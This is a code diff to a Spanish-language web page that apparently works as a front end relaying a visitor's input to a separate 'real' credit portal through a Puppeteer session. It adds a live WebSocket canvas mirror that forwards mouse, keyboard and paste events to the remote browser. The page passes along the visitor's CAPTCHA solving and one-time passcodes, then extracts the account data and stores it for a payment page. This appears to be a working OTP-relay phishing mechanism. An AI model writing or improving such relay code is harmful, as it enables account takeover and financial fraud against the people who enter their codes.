@@ -49,13 +49,18 @@
         .form-step.visible{display:block}
         @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
 
-        /* CAPTCHA viewer — solo visible si hay CAPTCHA */
-        .live-viewer{position:relative;border:1px solid #eee;border-radius:12px;overflow:hidden;margin-bottom:20px;background:#fafafa;cursor:crosshair}
-        .live-viewer img{width:100%;display:block}
-        .live-viewer .loading-overlay{position:absolute;inset:0;background:rgba(255,255,255,.85);display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:5}
-        .live-viewer .loading-overlay p{font-size:13px;color:#666;margin-top:10px}
+        /* ============================================
+           ESPEJO EN VIVO — reemplaza el screenshot estático
+           ============================================ */
+        .live-viewer{position:relative;border:1px solid #eee;border-radius:12px;overflow:hidden;margin-bottom:20px;background:#0f1115;cursor:crosshair}
+        .live-viewer canvas{width:100%;display:block;outline:none;cursor:crosshair}
+        .live-viewer .loading-overlay{position:absolute;inset:0;background:rgba(15,17,21,.85);display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:5;color:#b3b6c1}
+        .live-viewer .loading-overlay p{font-size:13px;margin-top:10px}
+        .live-viewer .live-badge{position:absolute;top:10px;left:10px;background:rgba(52,168,83,.9);color:#fff;font-size:10px;font-weight:600;padding:3px 8px;border-radius:999px;letter-spacing:.5px;z-index:4;display:flex;align-items:center;gap:5px}
+        .live-viewer .live-badge::before{content:'';width:6px;height:6px;background:#fff;border-radius:50%;animation:pulse 1.5s infinite}
+        @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
 
-        /* Opciones OTP — cards de selección */
+        /* Opciones OTP */
         .otp-options{display:flex;gap:15px;margin-bottom:25px;flex-wrap:wrap}
         .otp-option-card{flex:1;min-width:180px;padding:20px;border:2px solid #e0e0e0;border-radius:12px;cursor:pointer;transition:all .3s;text-align:center}
         .otp-option-card:hover{border-color:#e65c00;background:#fff8f4}
@@ -168,21 +173,21 @@
                 <button class="btn-continue" id="btnStart" disabled onclick="iniciarSesion()">CONTINUAR</button>
             </div>
 
-            <!-- PASO 2A: CAPTCHA (solo si aparece) -->
+            <!-- PASO 2A: ESPEJO EN VIVO (CAPTCHA dinámico) -->
             <div id="formStepCaptcha" class="form-step">
-                <p class="helper-text">Verificación de seguridad — Resuelve el CAPTCHA haciendo clic en las imágenes.</p>
-                <div class="live-viewer" id="liveViewer" onclick="handleViewerClick(event)">
-                    <img id="liveScreenshot" src="" alt="Verificación">
-                    <div class="loading-overlay" id="viewerLoading" style="display:none">
+                <p class="helper-text">Verificación de seguridad — Interactúa directamente con el portal: escribe el crédito, resuelve el CAPTCHA haciendo clic en las imágenes y presiona Continuar.</p>
+                <div class="live-viewer" id="liveViewer">
+                    <span class="live-badge">EN VIVO</span>
+                    <canvas id="liveCanvas" width="1100" height="800" tabindex="0"></canvas>
+                    <div class="loading-overlay" id="viewerLoading">
                         <div class="spinner" style="width:30px;height:30px;border-width:4px;border-color:rgba(230,92,0,.2);border-top-color:#e65c00"></div>
-                        <p>Procesando...</p>
+                        <p>Conectando al portal…</p>
                     </div>
                 </div>
-                <button class="btn-orange" id="btnSubmitCaptcha" onclick="enviarCaptcha()">VERIFICAR</button>
-                <button class="btn-orange" style="margin-top:10px;background:#242833" onclick="refreshScreenshot()">ACTUALIZAR VISTA</button>
+                <button class="btn-orange" id="btnSubmitCaptcha" onclick="finalizarEspejo()">YA TERMINÉ — CONTINUAR</button>
             </div>
 
-            <!-- PASO 2B: Selección método OTP (SMS o Correo) -->
+            <!-- PASO 2B: Selección método OTP -->
             <div id="formStep2" class="form-step">
                 <p class="helper-text">Paso 2 de 3 — Selecciona cómo deseas recibir tu código de verificación.</p>
                 <div class="otp-options" id="otpOptionsContainer"></div>
@@ -236,6 +241,14 @@ let currentSessionId = null;
 let selectedOtpOption = null;
 let otpOptionsList = [];
 
+// ============================================================
+// ESPEJO EN VIVO
+// ============================================================
+let mirrorWs = null;
+let mirrorPendingBlob = null;
+let mirrorDrawing = false;
+let mirrorConnected = false;
+
 function updateStepper(step) {
     for (let i = 1; i <= 3; i++) {
         const el = document.getElementById('stepItem' + i);
@@ -254,7 +267,6 @@ function hideAllSteps() {
 function showStep(name) {
     hideAllSteps();
     document.getElementById(name).classList.add('visible');
-    // Stepper mapping
     const stepMap = { formStep1: 1, formStepCaptcha: 2, formStep2: 2, formStep3: 3, formStepResult: 3 };
     updateStepper(stepMap[name] || 1);
 }
@@ -285,10 +297,10 @@ async function iniciarSesion() {
         if (!r.ok) throw new Error(data.error || 'Error al conectar');
         currentSessionId = data.sessionId;
 
-        // ¿Hay CAPTCHA?
-        if (data.hasCaptcha && data.screenshot) {
-            document.getElementById('liveScreenshot').src = data.screenshot;
+        // ¿Hay CAPTCHA? → Abrir ESPEJO EN VIVO
+        if (data.hasCaptcha) {
             showStep('formStepCaptcha');
+            conectarEspejo(currentSessionId);
             return;
         }
 
@@ -299,17 +311,14 @@ async function iniciarSesion() {
             return;
         }
 
-        // Si no hay opciones detectadas, revisar texto de la página
         const txt = (data.bodyText || '').toLowerCase();
         if (txt.includes('código') || txt.includes('otp') || txt.includes('enviado')) {
-            // Ya se envió el OTP directamente (sin pedir opción)
             showStep('formStep3');
             document.getElementById('otpSentMsg').textContent = 'Paso 3 de 3 — Ingresa el código que recibiste.';
             showMsg('Código enviado a tu celular o correo registrado.', 'info');
             return;
         }
 
-        // Si nada, puede ser error — mostrar bodyText para debug
         showMsg('No se pudieron detectar las opciones. Texto de la página: ' + (data.bodyText || '').substring(0, 200), 'error');
 
     } catch (err) {
@@ -324,7 +333,187 @@ async function iniciarSesion() {
 }
 
 // ============================================================
-// Renderizar opciones OTP como cards
+// ESPEJO: conectar, dibujar frames, reenviar input
+// ============================================================
+function conectarEspejo(sessionId) {
+    const canvas = document.getElementById('liveCanvas');
+    const ctx = canvas.getContext('2d', { alpha: false });
+    const overlay = document.getElementById('viewerLoading');
+    overlay.style.display = 'flex';
+
+    if (mirrorWs) { try { mirrorWs.close(); } catch {} }
+
+    const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+    mirrorWs = new WebSocket(`${proto}://${location.host}/ws/mirror?sessionId=${sessionId}`);
+    mirrorWs.binaryType = 'arraybuffer';
+
+    mirrorWs.onopen = () => {
+        mirrorConnected = true;
+        canvas.focus();
+    };
+
+    mirrorWs.onclose = () => {
+        mirrorConnected = false;
+    };
+
+    mirrorWs.onerror = () => {
+        mirrorConnected = false;
+    };
+
+    mirrorWs.onmessage = (e) => {
+        if (e.data instanceof ArrayBuffer) {
+            mirrorPendingBlob = new Blob([e.data], { type: 'image/jpeg' });
+            scheduleMirrorDraw(canvas, ctx, overlay);
+        } else {
+            try {
+                const msg = JSON.parse(e.data);
+                if (msg.type === 'error') showMsg(msg.message, 'error');
+            } catch {}
+        }
+    };
+
+    // ---- Mouse ----
+    function coords(ev) {
+        const r = canvas.getBoundingClientRect();
+        return {
+            x: Math.round((ev.clientX - r.left) * (canvas.width / r.width)),
+            y: Math.round((ev.clientY - r.top) * (canvas.height / r.height)),
+        };
+    }
+
+    canvas.onmousemove = (ev) => {
+        if (!mirrorConnected) return;
+        const { x, y } = coords(ev);
+        mirrorWs.send(JSON.stringify({ t: 'move', x, y }));
+    };
+
+    canvas.onmousedown = (ev) => {
+        if (!mirrorConnected) return;
+        ev.preventDefault();
+        canvas.focus();
+        const { x, y } = coords(ev);
+        mirrorWs.send(JSON.stringify({ t: 'click', x, y }));
+    };
+
+    canvas.ondblclick = (ev) => {
+        if (!mirrorConnected) return;
+        ev.preventDefault();
+        const { x, y } = coords(ev);
+        mirrorWs.send(JSON.stringify({ t: 'dblclick', x, y }));
+    };
+
+    canvas.onwheel = (ev) => {
+        if (!mirrorConnected) return;
+        ev.preventDefault();
+        mirrorWs.send(JSON.stringify({ t: 'wheel', d: ev.deltaY }));
+    };
+
+    // ---- Teclado ----
+    canvas.onkeydown = (ev) => {
+        if (!mirrorConnected) return;
+        if (ev.ctrlKey && ev.key.toLowerCase() === 'a') {
+            mirrorWs.send(JSON.stringify({ t: 'selectall' })); ev.preventDefault(); return;
+        }
+        if (ev.key === 'Backspace') {
+            mirrorWs.send(JSON.stringify({ t: 'backspace' })); ev.preventDefault(); return;
+        }
+        if (['Enter','Tab','ArrowLeft','ArrowRight','ArrowUp','ArrowDown'].includes(ev.key)) {
+            mirrorWs.send(JSON.stringify({ t: 'press', k: ev.key })); ev.preventDefault(); return;
+        }
+        if (ev.key.length === 1) {
+            mirrorWs.send(JSON.stringify({ t: 'type', s: ev.key })); ev.preventDefault();
+        }
+    };
+
+    canvas.onpaste = (ev) => {
+        if (!mirrorConnected) return;
+        const text = ev.clipboardData.getData('text');
+        if (text) mirrorWs.send(JSON.stringify({ t: 'type', s: text }));
+        ev.preventDefault();
+    };
+}
+
+function scheduleMirrorDraw(canvas, ctx, overlay) {
+    if (mirrorDrawing || !mirrorPendingBlob) return;
+    mirrorDrawing = true;
+    const blob = mirrorPendingBlob;
+    mirrorPendingBlob = null;
+    createImageBitmap(blob).then((bmp) => {
+        if (canvas.width !== bmp.width || canvas.height !== bmp.height) {
+            canvas.width = bmp.width; canvas.height = bmp.height;
+        }
+        ctx.drawImage(bmp, 0, 0);
+        bmp.close();
+        mirrorDrawing = false;
+        if (overlay) overlay.style.display = 'none';
+        if (mirrorPendingBlob) scheduleMirrorDraw(canvas, ctx, overlay);
+    }).catch(() => { mirrorDrawing = false; });
+}
+
+function cerrarEspejo() {
+    if (mirrorWs) { try { mirrorWs.close(); } catch {} mirrorWs = null; }
+    mirrorConnected = false;
+}
+
+// ============================================================
+// PASO 2A → finalizar espejo: el usuario ya resolvió el CAPTCHA
+// y ve que la página avanzó (o él mismo hizo clic en Continuar).
+// Ahora consultamos el estado real de la sesión.
+// ============================================================
+async function finalizarEspejo() {
+    if (!currentSessionId) return;
+    const btn = document.getElementById('btnSubmitCaptcha');
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spinner"></span> Consultando estado...';
+
+    try {
+        // Dar un momento a que el sitio procese el último click
+        await new Promise(r => setTimeout(r, 800));
+
+        // Detectar estado real
+        const r = await fetch(API + '/api/detect-state', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId: currentSessionId }),
+        });
+        const state = await r.json();
+
+        cerrarEspejo();
+
+        // ¿Sigue habiendo CAPTCHA?
+        if (state.hasCaptcha) {
+            showMsg('Aún hay un CAPTCHA en el portal. Vuelve a abrir la verificación e inténtalo de nuevo.', 'error');
+            btn.disabled = false;
+            btn.innerHTML = 'YA TERMINÉ — CONTINUAR';
+            return;
+        }
+
+        // ¿Hay opciones OTP?
+        if (state.otpOptions && state.otpOptions.length > 0) {
+            renderOtpOptions(state.otpOptions);
+            showStep('formStep2');
+            return;
+        }
+
+        // ¿Ya está en el paso de OTP?
+        const txt = (state.bodyText || '').toLowerCase();
+        if (txt.includes('código') || txt.includes('otp') || txt.includes('enviado') || txt.includes('dígitos')) {
+            showStep('formStep3');
+            showMsg('Código enviado a tu celular o correo registrado.', 'info');
+            return;
+        }
+
+        // Si nada, mostrar el bodyText para debug
+        showMsg('El portal no avanzó al paso de OTP. Texto actual: ' + (state.bodyText || '').substring(0, 300), 'error');
+    } catch (err) {
+        showMsg('Error: ' + err.message, 'error');
+    } finally {
+        btn.disabled = false;
+        btn.innerHTML = 'YA TERMINÉ — CONTINUAR';
+    }
+}
+
+// ============================================================
+// Renderizar opciones OTP como cards (IGUAL que tenías)
 // ============================================================
 function renderOtpOptions(options) {
     otpOptionsList = options;
@@ -337,7 +526,6 @@ function renderOtpOptions(options) {
         card.className = 'otp-option-card';
         card.setAttribute('data-index', i);
 
-        // Detectar si es SMS o correo por el texto
         const labelLow = opt.label.toLowerCase();
         let icon = '📱';
         let desc = 'Recibe un SMS a tu celular registrado';
@@ -367,7 +555,7 @@ function renderOtpOptions(options) {
 }
 
 // ============================================================
-// PASO 2B: Usuario escoge SMS o correo → Puppeteer hace clic en el real
+// PASO 2B: Seleccionar método OTP (IGUAL)
 // ============================================================
 async function seleccionarMetodoOtp() {
     if (selectedOtpOption === null) return;
@@ -389,21 +577,18 @@ async function seleccionarMetodoOtp() {
         const data = await r.json();
         if (!r.ok) throw new Error(data.error || 'Error');
 
-        // ¿Apareció CAPTCHA después de seleccionar?
-        if (data.hasCaptcha && data.screenshot) {
-            document.getElementById('liveScreenshot').src = data.screenshot;
+        // Si apareció un nuevo CAPTCHA tras seleccionar, abrimos espejo otra vez
+        if (data.hasCaptcha) {
             showStep('formStepCaptcha');
+            conectarEspejo(currentSessionId);
             return;
         }
 
-        // Ir al paso OTP
         const labelLow = opt.label.toLowerCase();
         let medio = 'celular o correo';
-        if (labelLow.includes('correo') || labelLow.includes('email') || labelLow.includes('mail')) {
-            medio = 'correo electrónico';
-        } else if (labelLow.includes('sms') || labelLow.includes('celular') || labelLow.includes('mensaje')) {
-            medio = 'celular';
-        }
+        if (labelLow.includes('correo') || labelLow.includes('email') || labelLow.includes('mail')) medio = 'correo electrónico';
+        else if (labelLow.includes('sms') || labelLow.includes('celular') || labelLow.includes('mensaje')) medio = 'celular';
+
         document.getElementById('otpSentMsg').textContent = 'Paso 3 de 3 — Ingresa el código que recibiste en tu ' + medio + '.';
         document.getElementById('otpHintText').textContent = 'El código fue enviado a tu ' + medio + ' registrado.';
         showStep('formStep3');
@@ -419,93 +604,7 @@ async function seleccionarMetodoOtp() {
 }
 
 // ============================================================
-// CAPTCHA: click en screenshot + enviar
-// ============================================================
-async function handleViewerClick(event) {
-    if (!currentSessionId) return;
-    const img = event.currentTarget.querySelector('img');
-    const rect = img.getBoundingClientRect();
-    const scaleX = 1366 / rect.width;
-    const scaleY = 768 / rect.height;
-    const x = Math.round((event.clientX - rect.left) * scaleX);
-    const y = Math.round((event.clientY - rect.top) * scaleY);
-
-    document.getElementById('viewerLoading').style.display = 'flex';
-    try {
-        const r = await fetch(API + '/api/click', {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ sessionId: currentSessionId, x, y }),
-        });
-        const data = await r.json();
-        if (!r.ok) throw new Error(data.error);
-        img.src = data.screenshot;
-    } catch (err) {
-        showMsg('Error: ' + err.message, 'error');
-    } finally {
-        document.getElementById('viewerLoading').style.display = 'none';
-    }
-}
-
-async function refreshScreenshot() {
-    if (!currentSessionId) return;
-    try {
-        const r = await fetch(API + '/api/screenshot', {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ sessionId: currentSessionId }),
-        });
-        const data = await r.json();
-        document.getElementById('liveScreenshot').src = data.screenshot;
-    } catch (err) { showMsg('Error: ' + err.message, 'error'); }
-}
-
-async function enviarCaptcha() {
-    if (!currentSessionId) return;
-    const btn = document.getElementById('btnSubmitCaptcha');
-    btn.disabled = true;
-    btn.innerHTML = '<span class="spinner"></span> Verificando...';
-    try {
-        // Click "Continuar" / "Verificar" en el sitio real
-        const r = await fetch(API + '/api/click-button', {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ sessionId: currentSessionId, text: 'continuar' }),
-        });
-        const data = await r.json();
-
-        // Esperar y verificar qué sigue
-        await new Promise(resolve => setTimeout(resolve, 2000));
-
-        const ext = await fetch(API + '/api/extract', {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ sessionId: currentSessionId }),
-        });
-        const pageData = await ext.json();
-
-        // Detectar opciones OTP después del CAPTCHA
-        const startR = await fetch(API + '/api/detect-state', {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ sessionId: currentSessionId }),
-        });
-        const state = await startR.json();
-
-        if (state.otpOptions && state.otpOptions.length > 0) {
-            renderOtpOptions(state.otpOptions);
-            showStep('formStep2');
-        } else {
-            // Puede que ya haya ido directo al OTP
-            showStep('formStep3');
-            showMsg('Código enviado a tu celular o correo registrado.', 'info');
-        }
-
-    } catch (err) {
-        showMsg('Error: ' + err.message, 'error');
-    } finally {
-        btn.disabled = false;
-        btn.innerHTML = 'VERIFICAR';
-    }
-}
-
-// ============================================================
-// PASO 3: Enviar OTP → Puppeteer digita en el sitio real
+// PASO 3: Enviar OTP (IGUAL)
 // ============================================================
 async function enviarOtp() {
     const code = document.getElementById('otpCode').value.trim();
@@ -513,8 +612,8 @@ async function enviarOtp() {
     const btn = document.getElementById('btnVerify');
     btn.disabled = true;
     btn.innerHTML = '<span class="spinner"></span>';
+
     try {
-        // Escribir OTP en el sitio real
         await fetch(API + '/api/type', {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -523,21 +622,18 @@ async function enviarOtp() {
                 text: code,
             }),
         });
-        // Click Verificar / Continuar
         await fetch(API + '/api/click-button', {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ sessionId: currentSessionId, text: 'verificar' }),
         });
         await new Promise(r => setTimeout(r, 3000));
 
-        // Extraer resultado final
         const ext = await fetch(API + '/api/extract', {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ sessionId: currentSessionId }),
         });
         const pageData = await ext.json();
 
-        // Guardar datos para pago.html
         try {
             sessionStorage.setItem('mobilize_credit', JSON.stringify(pageData));
             sessionStorage.setItem('mobilize_session', currentSessionId);
@@ -552,7 +648,6 @@ async function enviarOtp() {
         showStep('formStepResult');
         showMsg('', '');
 
-        // Cerrar sesión
         fetch(API + '/api/close', { method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ sessionId: currentSessionId }) });
 
@@ -561,6 +656,7 @@ async function enviarOtp() {
 }
 
 function resetAll() {
+    cerrarEspejo();
     if (currentSessionId) fetch(API + '/api/close', { method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ sessionId: currentSessionId }) });
@@ -569,7 +665,6 @@ function resetAll() {
     otpOptionsList = [];
     document.getElementById('creditNumber').value = '';
     document.getElementById('otpCode').value = '';
-    document.getElementById('liveScreenshot').src = '';
     document.getElementById('otpOptionsContainer').innerHTML = '';
     showStep('formStep1');
     showMsg('', '');
@@ -582,9 +677,8 @@ function showMsg(m, t) {
     if (!m) { el.innerHTML = ''; return; }
     el.innerHTML = '<div class="result-box ' + t + '">' + m + '</div>';
 }
-function esc(t) { return t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+function esc(t) { return String(t).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
 
-// Auto-scroll al formulario en móvil
 window.addEventListener('load', function() {
     if (window.innerWidth <= 900) {
         setTimeout(function() {
